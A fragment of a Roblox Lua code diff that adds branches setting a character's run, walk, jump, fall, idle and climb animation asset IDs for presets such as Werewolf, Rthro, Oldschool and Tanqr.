+                        if animwalk.Value == "Werewolf" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921342074"
+                        end
+
+                        if animfall.Value == "Werewolf" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921337907"
+                        end
+
+                        if animjump.Value == "Werewolf" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+                        end
+
+                        if animidle.Value == "Werewolf" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921330408"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921333667"
+                        end
+
+                        if animclimb.Value == "Werewolf" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921329322"
+                        end
+
+                        --- Rthro
+                        if animrun.Value == "Rthro" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921261968" 	
+                        end
+
+                        if animwalk.Value == "Rthro" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921269718"
+                        end
+
+                        if animfall.Value == "Rthro" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921262864"
+                        end
+
+                        if animjump.Value == "Rthro" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921263860"
+                        end
+
+                        if animidle.Value == "Rthro" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921258489"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921259953"
+                        end
+
+                        if animclimb.Value == "Rthro" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921257536"
+                        end
+
+                        --- Oldschool
+                        if animrun.Value == "Oldschool" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921240218" 	
+                        end
+
+                        if animwalk.Value == "Oldschool" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921244891"
+                        end
+
+                        if animfall.Value == "Oldschool" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921241244"
+                        end
+
+                        if animjump.Value == "Oldschool" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921242013"
+                        end
+
+                        if animidle.Value == "Oldschool" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921230744"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921232093"
+                        end
+
+                        if animclimb.Value == "Oldschool" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921229866"
+                        end
+
+                        --- Mr.Toilet
+                        if animrun.Value == "Toilet" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645" 	
+                        end
+
+                        if animidle.Value == "Toilet" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417978624"
+                        end
+
+                        --- Ud'Zal
+                        if animrun.Value == "Rthro Heavy Run" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3236836670" 	
+                        end
+
+                        if animidle.Value == "Ud'zal" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3303162274"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3303162549"
+                        end
+
+                        if animwalk.Value == "Ud'zal" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3303162967"
+                        end
+
+                        if animtype.Value == "Tryhard" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921157929"
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
+                        end
+
+                        if animtype.Value == "Goofy" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417978624"
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645"
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
+                        end
+
+                        if animtype.Value == "Tanqr" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921034824"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921036806"
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921312010"
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921306285"
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921242013"
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
+                        end
+                    until not anim.Enabled
                 end) 
             end
         end  
